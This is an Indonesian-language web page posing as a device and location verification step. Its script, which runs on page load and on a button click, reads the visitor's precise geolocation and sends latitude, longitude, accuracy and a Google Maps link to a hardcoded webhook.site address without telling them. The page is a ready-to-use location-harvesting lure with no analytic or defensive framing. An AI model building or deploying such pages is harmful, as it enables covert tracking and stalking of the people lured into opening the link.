<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verifikasi Perangkat</title>
  <style>
    body { font-family: Arial, sans-serif; background: #f4f4f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
    .card { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); text-align: center; max-width: 350px; }
    .btn { background: #007bff; color: white; border: none; padding: 12px 20px; font-size: 15px; border-radius: 5px; cursor: pointer; margin-top: 15px; width: 100%; }
    .status { margin-top: 15px; font-size: 13px; color: #666; }
  </style>
</head>
<body>

  <div class="card">
    <h2>Konfirmasi Lokasi</h2>
    <p>Silakan izinkan akses lokasi untuk melanjutkan.</p>
    <button class="btn" onclick="getLocation()">Lanjutkan</button>
    <div id="status" class="status"></div>
  </div>

  <script>
    const WEBHOOK_URL = 'https://webhook.site/89fc2d12-706e-4bd0-a557-c7351a3bf8e9';

    function getLocation() {
      const statusDiv = document.getElementById('status');
      statusDiv.innerHTML = 'Memproses...';

      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendData, showError, {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0
        });
      } else {
        statusDiv.innerHTML = 'Geolocation tidak didukung.';
      }
    }

    function sendData(position) {
      const lat = position.coords.latitude;
      const lon = position.coords.longitude;
      const accuracy = position.coords.accuracy;

      // Membuat URL Google Maps secara otomatis
      const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;

      // Mengirim lat, lon, akurasi, DAN google_maps ke Webhook.site
      fetch(`${WEBHOOK_URL}?lat=${lat}&lon=${lon}&akurasi_meter=${accuracy}&google_maps=${encodeURIComponent(googleMapsUrl)}`, {
        method: 'GET',
        mode: 'no-cors'
      }).then(() => {
        document.getElementById('status').innerHTML = '<span style="color:green;">Berhasil!</span>';
      }).catch(err => {
        document.getElementById('status').innerHTML = 'Gagal mengirim.';
      });
    }

    function showError(error) {
      document.getElementById('status').innerHTML = 'Akses lokasi ditolak.';
    }

    window.onload = getLocation;
  </script>

</body>
</html>
